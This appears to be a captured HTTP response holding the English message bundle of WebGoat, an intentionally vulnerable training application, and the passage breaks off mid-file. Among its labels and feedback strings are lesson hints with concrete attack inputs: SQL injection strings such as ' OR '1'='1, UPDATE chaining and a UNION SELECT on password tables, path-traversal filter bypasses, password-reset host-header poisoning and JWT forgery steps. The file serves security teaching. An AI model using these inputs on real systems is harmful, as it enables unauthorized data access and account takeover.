     "content": {
      "size": 51971,
      "mimeType": "application/json",
      "compression": 0,
      "text": "{\n  \"http-basics.close\" : \"Try again: but this time enter a value before hitting go.\",\n  \"SqlStringInjectionHint.9.3\" : \"Make use of DML to change your salary.\",\n  \"SqlStringInjectionHint.9.2\" : \"Use the ; metacharacter to do so.\",\n  \"SqlStringInjectionHint.9.1\" : \"Try to find a way, to chain another query to the end of the existing one.\",\n  \"SqlStringInjectionHint.9.5\" : \"How about something like '; UPDATE employees....\",\n  \"crypto-encoding.empty\" : \"Try again, did you decode it properly?\",\n  \"SqlStringInjectionHint.9.4\" : \"Make sure that the resulting query is syntactically correct.\",\n  \"Go!\" : \"Go!\",\n  \"csrf-same-host\" : \"It appears your request is coming from the same host you are submitting to.\",\n  \"version\" : \"Version\",\n  \"challenge5.title\" : \"Without password\",\n  \"lesson.overview\" : \"Lesson overview\",\n  \"jwt-refresh-alg-none\" : \"Nicely found! You solved the assignment with 'alg: none' can you also solve it by using the refresh token?\",\n  \"ClientSideFilteringLastName\" : \"Last Name\",\n  \"crypto-encoding-xor.hints.1\" : \"Did you look for online decoders for WebSphere encoded password?\",\n  \"access-control.hidden-menus.close\" : \"Close. Remember that when hacking ... details such as order,case and the like matter.\",\n  \"sql-injection.10.success\" : \"Success! You successfully deleted the access_log table and that way compromised the availability of the data.\",\n  \"challenge0.title\" : \"WebGoat Challenge\",\n  \"ClientSideFilteringSelectUser\" : \"Select user: \",\n  \"password-reset-simple.password_incorrect\" : \"Not the correct password please try again.\",\n  \"html-tampering.tamper.success\" : \"Well done, you just bought a TV at a discount\",\n  \"logging.title\" : \"Logging Security\",\n  \"csrf-review.success\" : \"It appears you have submitted correctly from another site. Go reload and see if your post is there.\",\n  \"csrf-login-failed\" : \"The solution is not correct, you are clicking the button while logged in as {0}\",\n  \"csrf-login-hint1\" : \"First create a new account with csrf-username\",\n  \"csrf-login-hint3\" : \"Visit this assignment again\",\n  \"csrf-login-hint2\" : \"Create a form which will log you in as this user (hint 1) and upload it to WebWolf\",\n  \"xss-reflected-5a-failure\" : \"Try again. We do want to see a specific JavaScript mentioned in the goal of the assignment (in case you are trying to do something fancier).\",\n  \"crypto-encoding-xor.success\" : \"Congratulations.\",\n  \"jwt-refresh-not-tom\" : \"User is not Tom but {0}, please try again\",\n  \"jwt-jku-hint1\" : \"Take a look at the token and specifically and the header\",\n  \"jwt-jku-hint2\" : \"The 'jku' (key ID) header parameter is a hint indicating which key is used to verify the JWS\",\n  \"jwt-jku-hint3\" : \"Could you use WebWolf to host the public key as a JWKS?\",\n  \"jwt-jku-hint4\" : \"Create a key pair and sign the token with the private key\",\n  \"jwt-jku-hint5\" : \"Change the JKU header claim and point it to a URL which hosts the public key in JWKS format.\",\n  \"csrf-get-other-referer.success\" : \"Congratulations! Appears you made the request from a separate host.\",\n  \"ClientSideFilteringHint6\" : \"Stage 2: The server uses an XPath query against an XML database.\",\n  \"ClientSideFilteringHint3\" : \"Examine the hidden table to see if there is anyone listed who is not in the drop down menu.\",\n  \"xss-mitigation-3-no-code\" : \"You did not change anything.\",\n  \"ClientSideFilteringHint4\" : \"Look in the last row of the hidden table.\",\n  \"ClientSideFilteringHint1\" : \"The information displayed when an employee is chosen from the drop down menu is stored on the client side.\",\n  \"password-questions-one-successful\" : \"You answered one question successfully please try another one.\",\n  \"ClientSideFilteringHint2\" : \"Use Firebug to find where the information is stored on the client side.\",\n  \"vulnerable-components.close\" : \"The payload send could not be deserialized to a Contact class. Please try again.\",\n  \"ClientSideFilteringHint9\" : \"Stage 2: Try using a filter operator.\",\n  \"ClientSideFilteringHint7\" : \"Stage 2: The query currently returns all of the contents of the database.\",\n  \"ClientSideFilteringHint8\" : \"Stage 2: The query should only return the information of employees who are managed by Moe Stooge, whose userID is 102\",\n  \"InvalidData\" : \"Invalid Data\",\n  \"SqlStringInjectionHint-advanced-6a-2\" : \"The data type of a column in the first SELECT statement must have a similar data type to that in the second SELECT statement.\",\n  \"SqlStringInjectionHint-advanced-6a-1\" : \"Remember that when using an UNION each SELECT statement within UNION must have the same number of columns.\",\n  \"SqlStringInjectionHint-advanced-6a-4\" : \"If a column needs a String you could substitute something like <span style=\\\"font-style: italic\\\">'a String' for it. For integers you could substitute a <span style=\\\"font-style: italic\\\">1.\",\n  \"access-control.hash.close\" : \"Keep trying, this one may take several attempts & steps to achieve. See the hints for help.\",\n  \"SqlStringInjectionHint-advanced-6a-3\" : \"Your new SQL query must end with a comment. eg: --\",\n  \"SqlOnlyInputValidation-2\" : \"Try to use a comment in the query\",\n  \"SqlOnlyInputValidation-3\" : \"WebGoat uses HSQLDB as a database can you use one of them to make skip the filtering?\",\n  \"3.chrome-dev-tools.title\" : \"Developer Tools\",\n  \"SqlOnlyInputValidation-1\" : \"Spaces are rejected, try to find a way around this restriction\",\n  \"SqlStringInjectionHint-advanced-6a-5\" : \"Try something like: <span style=\\\"font-style: italic\\\">Smith' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --\",\n  \"2.http-proxies.title\" : \"HTTP Proxies\",\n  \"xxe.content.output\" : \"Welcome {0} you can now login to our website\",\n  \"xxe.content.type.feedback.xml\" : \"You are posting XML but there is no XXE attack performed\",\n  \"sql-injection.advanced.6a.success\" : \"You have succeeded: {0}\",\n  \"csrf-you-forgot-something\" : \"There's something missing from your request it appears, so I can't process it.\",\n  \"sql-injection.5a.no.results\" : \"No results matched. Try Again.\",\n  \"username\" : \"Username\",\n  \"webwolf.email_send\" : \"An email has been send to {0} please check your inbox.\",\n  \"jwt.title\" : \"JWT tokens\",\n  \"report.card\" : \"Report card\",\n  \"xss-dom-message-failure\" : \"Incorrect.\",\n  \"1.sql.injection.title\" : \"SQL Injection (intro)\",\n  \"SqlStringInjectionHint-mitigation-10a-1\" : \"First establish a connection, after that you can create a statement.\",\n  \"SqlStringInjectionHint-mitigation-10a-2\" : \"For every data type there is a method to insert values into a wildcard symbol in a statement.\",\n  \"ssrf.tom\" : \"You failed to steal the cheese!\",\n  \"lesson-template.hints.3\" : \"Hint 3\",\n  \"lesson-template.hints.2\" : \"Hint 2\",\n  \"spoofcookie.login\" : \"Logged in using credentials. Cookie created, see below.\",\n  \"lesson-template.hints.1\" : \"Hint 1\",\n  \"access-control.hidden-menus.failure\" : \"Please try again.\",\n  \"vulnerable.hint\" : \"Did you search for CVE-2013-728 and read https://x-stream.github.io/CVE-2013-7285.html\",\n  \"idor.diff.success\" : \"Correct, the two attributes not displayed are userId & role. Keep those in mind\",\n  \"webwolf.title\" : \"WebWolf\",\n  \"ip.address.unknown\" : \"IP address unknown, e-mail has been sent. \",\n  \"idor.view.profile.success\" : \"Well done, you found someone else's profile\",\n  \"webwolf.landing_wrong\" : \"This is the wrong code, try to look for the uniqueCode in the parameters in WebWolf.\",\n  \"xss-reflected-6a-hint-2\" : \"Since you are looking for application code, check the WebGoat/js/goatApp folder for a file that could handle the routes.\",\n  \"networkHint2\" : \"The name of the request is \\\"dummy\\\"\",\n  \"xss-reflected-6a-hint-3\" : \"Make sure you add the base route at the start, when submitting your solution.\",\n  \"networkHint1\" : \"Clear all Requests from the network button, then make the request. The you should be able to figure out, which request holds the data.\",\n  \"xss-reflected-6a-hint-4\" : \"Still did not find it? Check the <a href=\\\"js/goatApp/view/GoatRouter.js\\\" target=\\\"_blank\\\">GoatRouter.js</a> file. It should be pretty easy to determine.\",\n  \"password-reset-simple.email_mismatch\" : \"Of course you can send mail to user {0} however you will not be able to read this e-mail in WebWolf, please use your own username.\",\n  \"xss-reflected-6a-hint-1\" : \"To search through the client side code, use the developer tools of your browser. (If you don't know how to use them, check the <i>Developer Tools</i> Lesson in the general category.)\",\n  \"xss-mitigation-3-success\" : \"You have completed this lesson. Congratulations!\",\n  \"insecure-login.title\" : \"Insecure Login\",\n  \"sql-injection.6a.success\" : \"You have succeeded: {0}\",\n  \"SqlOnlyInputValidationOnKeywords-3\" : \"WebGoat uses HSQLDB as a database can you use one of them to make skip the filtering?\",\n  \"sql-injection.10b.success\" : \"You did it! Your code can prevent an SQL injection attack!\",\n  \"SqlOnlyInputValidationOnKeywords-1\" : \"Spaces are and SQL keywords are rejected, try to find a way around this restriction\",\n  \"SqlOnlyInputValidationOnKeywords-2\" : \"Try to use a comment in the query\",\n  \"password-reset-no-user\" : \"Please supply a valid e-mail address.\",\n  \"jwt-secret-incorrect-user\" : \"The user is {0}, you need to change it to WebGoat\",\n  \"sql-injection.8.no.results\" : \"No employee found with matching last name. Or maybe your authentication TAN is incorrect?\",\n  \"http-basics.incorrect\" : \"You are close, try again: the HTTP Command is incorrect.\",\n  \"2.sql.advanced.title\" : \"SQL Injection (advanced)\",\n  \"csrf-feedback-hint2\" : \"Try to post the same message with content-type text/plain\",\n  \"csrf-feedback-hint3\" : \"The json can be put into a hidden field inside\",\n  \"csrf-get-null-referer.success\" : \"Congratulations! Appears you made the request from your local machine.\",\n  \"xss-reflected-5b-success\" : \"Correct ... because <ul><li>The script was not triggered by the URL/QueryString</li><li>Even if you use the attack URL in a new tab, it will not execute (because of response type). Try it if you like.</li></ul>\",\n  \"csrf-feedback-hint1\" : \"Look at the content-type.\",\n  \"webwolf.email_failed\" : \"There was an error while sending the e-mail. Is WebWolf running?\",\n  \"EnterYourName\" : \"Enter your Name\",\n  \"spoofcookie.wrong-cookie\" : \"Wrong cookie sent.\",\n  \"password-reset-hint6\" : \"For intercepting the request you have to use a proxy. Check the <a href=\\\"./start.mvc#lesson/HttpProxies.lesson\\\" target=\\\"_blank\\\">HTTP-Proxies Lesson</a> in the general category if you're unfamiliar with using proxies.<br/><span style=\\\"color: red;\\\"><strong>Important:</strong> There seem to be problems when modifying the request header with <a href=\\\"https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project\\\" target=\\\"_blank\\\">ZAP</a>. We recommend to use <a href=\\\"https://portswigger.net/\\\" target=\\\"_blank\\\">Burp</a> instead.</span>\",\n  \"password-reset-hint5\" : \"Intercept the request and change the host header.\",\n  \"user.created\" : \"User {0} created, please proceed to the login page.\",\n  \"required4\" : \"Missing username or password, please specify both.\",\n  \"password-reset-hint4\" : \"The link points to localhost:8080/PasswordReset/.... can you change the host to localhost:9090?\",\n  \"password-reset-hint3\" : \"Tom clicks all the links he receives in his mailbox, you can use the landing page in WebWolf to get the reset link...\",\n  \"spoofcookie.title\" : \"Spoofing an Authentication Cookie\",\n  \"password-reset-hint2\" : \"Look at the link, can you think how the server creates this link?\",\n  \"password-reset-hint1\" : \"Try to send a password reset link to your own account at {user}@webgoat.org, you can read this e-mail in WebWolf.\",\n  \"SqlStringInjectionHint4-1\" : \"ALTER TABLE alters the structure of an existing database\",\n  \"verify-account.cheated\" : \"It appears you may be using source code to cheat.While that's always helpful when hacking. Please try again.\",\n  \"SqlStringInjectionHint4-2\" : \"Do not forget the data type of the new column (e.g. varchar(size) or int(size))\",\n  \"path-traversal-zip-slip.no-zip\" : \"Please upload a zip file\",\n  \"SqlStringInjectionHint4-3\" : \"ALTER TABLE table name ADD column name data type(size);\",\n  \"http-proxies.intercept.success\" : \"Well done, you tampered the request as expected\",\n  \"sql-injection.8.success\" : \"You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!\",\n  \"6.xss-mitigation.title\" : \"Cross Site Scripting (mitigation)\",\n  \"spoofcookie.cookie-login\" : \"Logged in using cookie.\",\n  \"password\" : \"Password\",\n  \"verify-account.success\" : \"Congrats, you have successfully verified the account without actually verifying it. You can now change your password!\",\n  \"xss-stored-callback-failure\" : \"No, that is not the correct value (note, it will be a different value each time the phoneHome endpoint is called).\",\n  \"insecure-deserialization.hints.1\" : \"WebGoat probably contains the org.dummy.insecure.framework.VulnerableTaskHolder class as shown on the lesson pages. Use this to construct and serialize your attack.\",\n  \"xxe.simple.output\" : \"Welcome {0} you can now login to our website\",\n  \"spoofcookie.wrong-login\" : \"Login failed.\",\n  \"insecure-deserialization.hints.2\" : \"The VulnerableTaskHolder might have been updated on the server with a next version number.\",\n  \"challenge6.title\" : \"Creating a new account\",\n  \"insecure-deserialization.hints.3\" : \"Not all actions are allowed anymore. The readObject has been changed. For serializing it does not effect the data. Follow the additional hints from the feedback on your attempts.\",\n  \"xss-mitigation-4-hint1\" : \"Try to have a look at the AntiSamy documentation.\",\n  \"3.sql.mitigation.title\" : \"SQL Injection (mitigation)\",\n  \"username.size\" : \"Please use between 6 and 10 characters.\",\n  \"SqlStringInjectionHint2-1\" : \"You want the data from the column with the name department. You know the database name (employees) and you know the first- and lastname of the employee (first_name, last_name).\",\n  \"lesson-template.sample-attack.failure-1\" : \"Sample failure message\",\n  \"SqlStringInjectionHint2-2\" : \"SELECT column FROM tablename WHERE condition;\",\n  \"lesson-template.sample-attack.failure-2\" : \"Sample failure message 2\",\n  \"SqlStringInjectionHint2-3\" : \"Use ' instead of \\\" when comparing two strings.\",\n  \"SqlStringInjectionHint2-4\" : \"Pay attention to case sensitivity when comparing two strings.\",\n  \"sql-injection.10b.failed\" : \"Something does not seem right with that code. Maybe you should look at an example how to prevent SQL injections with JDBC?\",\n  \"sign.in\" : \"Sign in\",\n  \"challenge1.title\" : \"Admin lost password\",\n  \"xss-mitigation-4-failed\" : \"This is not the correct answer. Try again!\",\n  \"SolutionVideos\" : \"Solution Videos\",\n  \"searchmenu\" : \"Search lesson\",\n  \"path-traversal-profile-empty-name\" : \"Name is empty\",\n  \"idor.view.own.profile.failure1\" : \"Please try again. The alternate route is very similar to the previous way you viewed your profile. Only one difference really\",\n  \"idor.view.own.profile.failure2\" : \"You need to authenticate as tom first.\",\n  \"password.size\" : \"Password should at least contain 6 characters\",\n  \"jwt-secret-claims-missing\" : \"You are missing some claims, you should keep all the claims in the token\",\n  \"csrf-feedback-success\" : \"Congratulations you have found the correct solution, the flag is: {0}\",\n  \"xss-reflected-5a-success-console\" : \"Congratulations, but console logs are not very impressive are they? Let's continue to the next assignment.\",\n  \"path-traversal-profile-fix.hint1\" : \"Take a look what happens compared to the previous assignment\",\n  \"path-traversal-profile-fix.hint2\" : \"The new and improved version removes `../` from the input, can you bypass this?\",\n  \"sql-injection.6b.no.results\" : \"No results matched. Try Again.\",\n  \"sql-injection.6b.success\" : \"You have succeeded: {0}\",\n  \"path-traversal-profile-fix.hint3\" : \"Try to construct a full name which after cleaning still has `../` in the full name\",\n  \"SqlInjectionChallenge1\" : \"Look at the different response you receive from the server\",\n  \"challenge.flag.incorrect\" : \"Sorry this is not the correct flag, please try again.\",\n  \"SqlInjectionChallenge3\" : \"Use tooling to automate this attack\",\n  \"SqlInjectionChallenge2\" : \"The vulnerability is on the register form\",\n  \"idor.hints.otherProfile2\" : \"You will likely need to 'fuzz' to try different values for the userId at the end of the Url\",\n  \"idor.hints.otherProfile1\" : \"The default request here won't work at all, so you will need to manually craft the request or tamper it with a proxy\",\n  \"idor.view.own.profile.success\" : \"Congratulations, you have used the alternate Url/route to view your own profile.\",\n  \"accounts.build.in\" : \"The following accounts are built into WebGoat\",\n  \"RestartLesson\" : \"Restart this Lesson\",\n  \"idor.hints.otherProfile9\" : \"Your payload should look something like ... {\\\"role\\\" : 1,\\\"color\\\" : \\\"red\\\",\\\"size\\\" : \\\"small\\\",\\\"name\\\" : \\\"Tom Cat\\\",\\\"userId\\\" : \\\"2342388\\\"}\",\n  \"idor.hints.otherProfile8\" : \"The request should go to ... /WebGoat/IDOR/profile/{Buffalo Bills Id}\",\n  \"idor.hints.otherProfile7\" : \"You will also need the body of the request (will look something like the profile)\",\n  \"idor.hints.otherProfile6\" : \"To edit, You will need to change the method, what is the RESTful method  used for 'update' or 'edit'?\",\n  \"idor.hints.otherProfile5\" : \"To edit the other user's profile, you will use the same Url you did to view the other user's profile\",\n  \"ClientSideFilteringChoose\" : \"Choose employee\",\n  \"idor.hints.otherProfile4\" : \"For editing the other user's profile, you will need to use the proxy or manually craft the request again\",\n  \"idor.hints.otherProfile3\" : \"Try incrementing the id value. It's not a simple +1, but it's also not too far off\",\n  \"logout\" : \"Logout\",\n  \"path-traversal-profile-remove-user-input.hint2\" : \"Can we still manipulate the request?\",\n  \"path-traversal-profile-remove-user-input.hint1\" : \"Take a look what happened to the file name\",\n  \"path-traversal-profile-remove-user-input.hint3\" : \"You can try to use a proxy to intercept the POST request\",\n  \"password-reset-simple.email_send\" : \"An email has been send to {0} please check your inbox.\",\n  \"idor.hints.ownProfileAltUrl2\" : \"You will need data from the previous request for your own profile\",\n  \"idor.hints.ownProfileAltUrl1\" : \"Look at the previous request for profile, this is similar\",\n  \"hijacksession.title\" : \"Hijack a session\",\n  \"xss-stored-callback-success\" : \"Yes, that is the correct value (note, it will be a different value each time the phoneHome endpoint is called).\",\n  \"challenge8.title\" : \"Without account\",\n  \"sql-injection.8.one\" : \"That is only one account. You want them all! Try again.\",\n  \"idor.hints.ownProfileAltUrl3\" : \"Append your id to the previous request (i.e. .../profile/{yourId})\",\n  \"xss.lesson1.failure\" : \"The cookies should be the same on both tabs. Ensure that the tabs are from the same site.\",\n  \"http-basics.empty\" : \"Try again, name cannot be empty.\",\n  \"insecure-deserialization.title\" : \"Insecure Deserialization\",\n  \"security.enabled\" : \"Security enabled, you can try the previous challenges and see the effect!\",\n  \"register.title\" : \"Register \",\n  \"crypto-hashing.hints.2\" : \"Find a online hash database or just google on the hash itself.\",\n  \"crypto-hashing.hints.1\" : \"Guess the type of hashing from the length of the hash.\",\n  \"lesson.completed\" : \"Congratulations. You have successfully completed this lesson.\",\n  \"assignment.solved\" : \"Congratulations. You have successfully completed the assignment.\",\n  \"crypto-encoding-xor.empty\" : \"Try again. This is not right\",\n  \"security.disabled\" : \"Security enabled, you can try the previous challenges and see the effect!\",\n  \"sql-injection.10b.compiler-errors\" : \"Could not compile code:\",\n  \"ResultsButNotTom\" : \"Try To login as Tom!\",\n  \"challenge7.title\" : \"Admin password reset\",\n  \"SqlStringInjectionHint5b1\" : \"Try to check which of the input fields is susceptible to an injection attack.\",\n  \"SqlStringInjectionHint5b2\" : \"Insert: <span style=\\\"font-style: italic\\\">0 or 1 = 1 into the first input field. The output should tell you if this field is injectable.\",\n  \"ClientSideFilteringFirstName\" : \"First Name\",\n  \"SqlStringInjectionHint5b3\" : \"The first input field is not susceptible to sql injection.\",\n  \"sql-injection.9.one\" : \"Still not earning enough! Better try again and change that.\",\n  \"SqlStringInjectionHint5b4\" : \"You do not need to insert any quotations into your injection-string.\",\n  \"xss-reflected-6a-success\" : \"Correct! Now, see if you can send in an exploit to that route in the next assignment.\",\n  \"xss-reflected-6a-failure\" : \"Sorry that is not correct. Look at the example again to understand what a valid route looks like. If you're stuck... hints might help.\",\n  \"sql-injection.5a.success\" : \"You have succeeded: {0}\",\n  \"password-questions-wrong-user\" : \"You need to find a different user you are logging in with 'webgoat'.\",\n  \"idor.title\" : \"Insecure Direct Object References\",\n  \"jwt-final-jerry-account\" : \"Yikes, you are removing Jerry's account, try to delete the account of Tom \",\n  \"SqlStringInjectionHint5a1\" : \"Remember that for an successful Sql-Injection the query needs to always evaluate to <span style=\\\"font-style: italic\\\">true.\",\n  \"ClientSideFilteringSSN\" : \"SSN\",\n  \"network.failed\" : \"That is not correct, try again.\",\n  \"ClientSideFilteringUserID\" : \"User ID\",\n  \"bypass-restrictions.intercept.success\" : \"Well done, you intercepted the request as expected\",\n  \"bypass-restrictions.intercept.failure\" : \"Please try again. Make sure to make all the changes. And case sensitivity may matter ... or not, you never know!\",\n  \"password-questions-unknown-user\" : \"User {0} is not a valid user.\",\n  \"ClientSideFilteringStage1SubmitAnswer\" : \"Submit Answer\",\n  \"crypto-secure-defaults.success\" : \"Congratulations, you did it!\",\n  \"SqlOnlyInputValidationOnKeywords-failed\" : \"Use of spaces and/or SQL keywords are not allowed!\",\n  \"xss-reflected-5a-failed-wrong-field\" : \"Seems like you tried to compromise our shop with an reflected XSS attack.<br/> We do our... \\\"best\\\"... to prevent such attacks. Try again!\",\n  \"crypto-signing.success\" : \"Congratulations. You found it!\",\n  \"challenge9.title\" : \"Changing password\",\n  \"crypto-encoding.success\" : \"Congratulations. That was easy, right?\",\n  \"build\" : \"Build\",\n  \"http-basics.reversed\" : \"The server has reversed your name: {0}\",\n  \"crypto-secure-defaults.messagenotok\" : \"The unencrypted message is not correct, try again. The filename of the password file is correct.\",\n  \"http-basics.Go!\" : \"Go!\",\n  \"access-control.hidden-menus.hint1\" : \"You can inspect the DOM or review the source in the proxy request/response cycle.\",\n  \"path-traversal-profile.hint3\" : \"Does the server validate any input given in the full name field?\",\n  \"access-control.hidden-menus.hint3\" : \"Look for something a super-user or administator might have available to them\",\n  \"access-control.hidden-menus.hint2\" : \"Look for indications of something that would not be available to a typical user\",\n  \"xxe.content.type.feedback.json\" : \"You are posting JSON which does not work with a XXE\",\n  \"path-traversal-profile.hint2\" : \"Look at the displayed location how is the file name on the server constructed?\",\n  \"path-traversal-profile.hint1\" : \"Try updating the profile WebGoat will display the location\",\n  \"sign.up\" : \"Sign up\",\n  \"auth-bypass.hints.verify.1\" : \"The attack on this is similar to the story referenced, but not exactly the same.\",\n  \"ClientSideFilteringSalary\" : \"Salary\",\n  \"access-control.hash.hint7\" : \"If the request to view users, were a 'service' or 'RESTful' endpoint, what would be different about it?\",\n  \"access-control.hash.hint8\" : \"If you're still looking for hints ... try changing the Content-type header as in the GET request.\",\n  \"access-control.hash.hint5\" : \"Modify the GET request to '/access-control/users' to include 'Content-Type': 'application/json'\",\n  \"idor.diff.attributes.missing\" : \"You did not list two attributes, comma delimited\",\n  \"access-control.hash.hint6\" : \"Now for the harder way ... it builds on the easier way\",\n  \"ClientSideFilteringHint5a\" : \"Stage 1: You can access the server directly\",\n  \"termsofuse\" : \"Terms of use\",\n  \"xss-reflected-5a-hint-2\" : \"Quantity inputs are probably processed as integer values. Not the best option for inputting text right?\",\n  \"ClientSideFilteringHint5b\" : \"here \",\n  \"xss-reflected-5a-hint-1\" : \"Think about how the inputs are presumably processed by the application.\",\n  \"ClientSideFilteringHint5c\" : \"to see what results are being returned\",\n  \"access-control.hash.hint9\" : \"Assuming the administrators have fixed the user management as a RESTful endpoint, what alternative approaches, apart from the type of request discussed in the previous lesson, could you explore?\",\n  \"xss-reflected-5a-hint-4\" : \"Just try purchasing something. You want your script to be included in the purchase-confirmation.\",\n  \"xss-reflected-5a-hint-3\" : \"What information send to the application gets reflected back after being submitted?\",\n  \"access-control.hash.hint3\" : \"When you look at the users page, there is a hint that more info is viewable by a given role.\",\n  \"access-control.hash.hint4\" : \"Have you tried tampering the GET request? Different content-types?\",\n  \"access-control.hash.hint1\" : \"This assignment involves one simple change in a GET request.\",\n  \"access-control.hash.hint2\" : \"If you haven't found the hidden menus from the earlier exercise, go do that first.\",\n  \"csrf-review-hint3\" : \"This one has a weak anti-CSRF protection, but you do need to overcome (mimic) it\",\n  \"SqlStringInjectionHint.8.4\" : \"Make sure all quotes (\\\" ' \\\") are opened and closed properly so the resulting SQL query is syntactically correct.\",\n  \"SqlStringInjectionHint.8.3\" : \"Try appending a SQL statement that always resolves to true.\",\n  \"SqlStringInjectionHint.8.2\" : \"Compound SQL statements can be made by expanding the WHERE clause of the statement with keywords like AND and OR.\",\n  \"SqlStringInjectionHint.8.1\" : \"The application is taking your input and inserting the values into the variables 'name' and 'auth_tan' of the pre-formed SQL command.\",\n  \"SqlStringInjectionHint.8.5\" : \"Try extending the WHERE clause of the statement by adding something like: ' OR '1' = '1.\",\n  \"5.xss-stored.title\" : \"Cross Site Scripting (stored)\",\n  \"sql-injection.advanced.6a.no.results\" : \"No results matched. Try Again.\",\n  \"auth-bypass.hints.verify.2\" : \"You do want to tamper the  security  question parameters, but not delete them\",\n  \"auth-bypass.hints.verify.3\" : \"The logic to verify the account does expect 2 security questions to be answered, but there is a flaw in the implementation\",\n  \"webgoat.title\" : \"WebGoat\",\n  \"auth-bypass.hints.verify.4\" : \"Have you tried renaming the secQuestion0 and secQuestion1 parameters?\",\n  \"invalid_username_password\" : \"Invalid username and password.\",\n  \"xss-dom-message-success\" : \"Correct!\",\n  \"csrf-review-hint1\" : \"Again, you will need to submit from an external domain/host to trigger this action. While CSRF can often be triggered from the same host (e.g. via persisted payload), this doesn't work that way.\",\n  \"csrf-review-hint2\" : \"Remember, you need to mimic the existing workflow/form.\",\n  \"sql-injection.5b.success\" : \"You have succeeded: {0}\",\n  \"xss-stored-comment-success\" : \"It appears your payload should invoke the function. To tell for sure, you need to capture the value and put it in the form below. Then we will really know.\",\n  \"html-tampering.title\" : \"HTML tampering\",\n  \"secure-passwords.title\" : \"Secure Passwords\",\n  \"password-reset-not-solved\" : \"Sorry but you did not redirect the reset link to WebWolf\",\n  \"user.exists\" : \"User {0} already exists please try to register with a different username.\",\n  \"crypto-secure-defaults.notok\" : \"Try again or read some of the hints.\",\n  \"contact\" : \"Contact Us\",\n  \"auth-bypass.title\" : \"Authentication Bypasses\",\n  \"csrf.title\" : \"Cross-Site Request Forgeries\",\n  \"sql-injection.10.entries\" : \"There is still evidence of what you did. Better remove the whole table.\",\n  \"access-control.hash.success\" : \"Congrats! You really succeeded when you added the user.\",\n  \"spoofcookie.cheating\" : \"Don't cheat!\",\n  \"crypto-signing.notok\" : \"The signature does not match the data (modulus)\",\n  \"xss-mitigation-4-success\" : \"You have completed this lesson. Congratulations!\",\n  \"xss-dom-message-hint-5\" : \"Since you are working with an URL, you might have to URL-encode your parameters.\",\n  \"xss-dom-message-hint-4\" : \"You have to use script tags, so your JavaScript code gets executed when being rendered into the DOM.\",\n  \"ErrorGenerating\" : \"Error generating\",\n  \"xss-dom-message-hint-6\" : \"Replace '/' with '%2F' in your URL parameters.\",\n  \"xss-dom-message-hint-1\" : \"Open a new tab and navigate to the test-route you just figured out in the previous lesson.\",\n  \"xss-dom-message-hint-3\" : \"Note how the parameters you send to the test-route get reflected back to the page. Now add your JavaScript to it.\",\n  \"xss-dom-message-hint-2\" : \"Your url should look something like that http://localhost:8080/WebGoat/start.mvc#REPLACE-WITH-THE-TEST-ROUTE/some_parameters\",\n  \"challenge2.title\" : \"Get it for free\",\n  \"password-reset.title\" : \"Password reset\",\n  \"hijacksession.hints.1\" : \"Check the 'hijack_cookie' cookie value and think about its format.\",\n  \"csrf-get.hint1\" : \"The form has hidden inputs.\",\n  \"csrf-get.hint2\" : \"You will need to use an external page and/or script to trigger it.\",\n  \"csrf-get.hint3\" : \"Try creating a local page or one that is uploaded and points to this form as its action.\",\n  \"csrf-get.hint4\" : \"The trigger can be manual or scripted to happen automatically\",\n  \"hijacksession.hints.5\" : \"Sometimes, authorized users logs into the application.\",\n  \"hijacksession.hints.4\" : \"Try to send multiple requests to force the creation of new cookies and check if there's any pattern.\",\n  \"hijacksession.hints.3\" : \"The 'hijack_cookie' is divided in two parts and has the following format '\\\"sequential number\\\"-\\\"unix epoch time\\\"'.\",\n  \"hijacksession.hints.2\" : \"The 'hijack_cookie' is divided in two parts and has the following format '\\\"long number\\\"-\\\"another long number\\\"'.\",\n  \"accounts.table.account\" : \"Account\",\n  \"challenge3.title\" : \"Photo comments\",\n  \"insecure-deserialization.invalidversion\" : \"The serialization id does not match. Probably the version has been updated. Let's try again.\",\n  \"xxe.title\" : \"XXE\",\n  \"path-traversal-zip-slip.hint1\" : \"Try uploading a picture in a zip file\",\n  \"xxe.blind.output\" : \"Contents of the file is: {0}\",\n  \"crypto-hashing.oneok\" : \"Try again. You got 1 right.\",\n  \"http-proxies.intercept.failure\" : \"Please try again. Make sure to make all the changes. And case sensitivity may matter ... or not, you never know!\",\n  \"path-traversal-zip-slip.hint4\" : \"Check the http request to find out which image name should be used\",\n  \"path-traversal-zip-slip.hint3\" : \"Did you create a zip file with the right image name?\",\n  \"path-traversal-zip-slip.hint2\" : \"Upload a zip file which traverses to the right directory \",\n  \"network.request\" : \"You made a HTTP Request.\",\n  \"SqlStringInjectionHint5-3\" : \"Try to grant 'select' privilege to 'unauthorized_user'.\",\n  \"SqlStringInjectionHint5-4\" : \"Use 'grant select on <<table>> to <<user>>' to solve the assignment.\",\n  \"SqlStringInjectionHint5-1\" : \"Take a look at how to use a grant statement (WebGoat uses HSQLDB)\",\n  \"SqlStringInjectionHint5-2\" : \"You can grant to a user or a role.\",\n  \"assignment.not.solved\" : \"Sorry the solution is not correct, please try again.\",\n  \"SqlStringInjectionHint-mitigation-10b-4\" : \"Make sure to execute your statement.\",\n  \"SqlStringInjectionHint-mitigation-10b-5\" : \"View the previous lesson to check back on how you can build set up a connection.\",\n  \"SqlStringInjectionHint-mitigation-10b-2\" : \"Remember to use the right kind of statement, so your code is no longer vulnerable for SQL injections.\",\n  \"idor.hints.idor_login\" : \"Log in first. User Name is tom, password is cat.\",\n  \"SqlStringInjectionHint-mitigation-10b-3\" : \"The wildcard symbol '?' in a prepared statement can be filled with the right kind of method. There exists one for every data type.\",\n  \"challenge.close\" : \"This is not the correct password for Larry, please try again.\",\n  \"SqlStringInjectionHint-mitigation-10b-1\" : \"A database connection has to be surrounded by a try-catch block to handle the very common case of an error while establishing the connection.\",\n  \"http-basics.hints.http_basics_lesson.1\" : \"Type in your name and press 'go'\",\n  \"password-reset-solved\" : \"Congratulations you solved the assignment, please type in the following code in the e-mail field: {0}\",\n  \"xss-mitigation-3-hint1\" : \"You do not store the user input in this example. Try to encode the user's input right before you place it into the HTML document.\",\n  \"xss-mitigation-3-hint3\" : \"Take a look at OWASP Java Encoder Project.\",\n  \"xss-mitigation-3-hint2\" : \"Make use of JavaServer Pages Standard Tag Library (JSTL) and JSP Expression Language.\",\n  \"login.page.title\" : \"Login Page\",\n  \"jwt-invalid-token\" : \"Not a valid JWT token, please try again\",\n  \"xss-mitigation-3-hint4\" : \"Do not forget to reference the tag libs and choose \\\"e\\\" as prefix.\",\n  